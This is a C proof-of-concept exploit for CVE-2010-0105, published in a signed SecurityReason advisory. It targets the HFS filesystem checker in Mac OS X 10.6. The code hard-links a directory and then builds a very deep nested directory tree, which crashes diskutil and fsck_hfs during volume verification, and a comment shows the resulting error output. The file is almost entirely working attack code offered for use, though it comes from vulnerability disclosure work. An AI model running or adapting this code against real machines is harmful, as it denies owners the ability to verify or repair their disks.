// -----BEGIN PGP SIGNED MESSAGE-----
// Hash: SHA1
/* 	Proof of Concept for CVE-2010-0105
	MacOS X 10.6 hfs file system attack (Denial of Service)
	by Maksymilian Arciemowicz from SecurityReason.com

	http://securityreason.com/achievement_exploitalert/15

	NOTE:

	This DoS will be localized in phase

	Checking multi-linked directories

	So we need activate it with line

		connlink("C/C","CX");

	Now we need create PATH_MAX/2 directory tree to make overflow.

	and we should get diskutil and fsck_hfs exit with sig=8

	~ x$ diskutil verifyVolume /Volumes/max2
	Started filesystem verification on disk0s3 max2
	Performing live verification
	Checking Journaled HFS Plus volume
	Checking extents overflow file
	Checking catalog file
	Checking multi-linked files
	Checking catalog hierarchy
	Checking extended attributes file
	Checking multi-linked directories
	Maximum nesting of folders and directory hard links reached
	The volume max2 could not be verified completely
	Error: -9957: Filesystem verify or repair failed
	Underlying error: 8: POSIX reports: Exec format error


*/
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/param.h>
#include <sys/stat.h>
#include <sys/types.h>


int createdir(char *name){
	if(0!=mkdir(name,((S_IRWXU | S_IRWXG | S_IRWXO) & ~umask(0))| S_IWUSR
|S_IXUSR)){
		printf("Can`t create %s", name);
		exit(1);}
		else
		return 0;
}

int comein(char *name){
	if(0!=chdir(name)){
		printf("Can`t chdir in to %s", name);
		exit(1);}
		else
		return 0;
}

int connlink(a,b)
char *a,*b;
{
	if(0!=link(a,b)){
		printf("Can`t create link %s => %s",a,b);
		exit(1);}
		else
		return 0;
}

int main(int argc,char *argv[]){

 	int level;
	FILE *fp;

	if(argc==2) {
		level=atoi(argv[1]);
	}else{
		level=512; //default
	}
	createdir("C"); //create hardlink
	createdir("C/C"); //create hardlink

	connlink("C/C","CX"); //we need use to checking multi-linked directorie

	comein("C");

	while(level--)
			printf("Level: %i mkdir:%i chdir:%i\n",level,
			createdir("C"),
			comein("C"));


	printf("check diskutil verifyVolume /\n");
	return 0;
}
/*
- --
Best Regards,
- ------------------------
pub   1024D/A6986BD6 2008-08-22
uid                  Maksymilian Arciemowicz (cxib)
<cxib@securityreason.com>
sub   4096g/0889FA9A 2008-08-22

http://securityreason.com
http://securityreason.com/key/Arciemowicz.Maksymilian.gpg
-----BEGIN PGP SIGNATURE-----

iEYEARECAAYFAkvTTQsACgkQpiCeOKaYa9bHwACfSRqy8xJbJBGFvLbLIjabxMkI
to4AoMMetii9Gc7EyOK7/3+QP4ynP5kY
=IML/
-----END PGP SIGNATURE-----
*/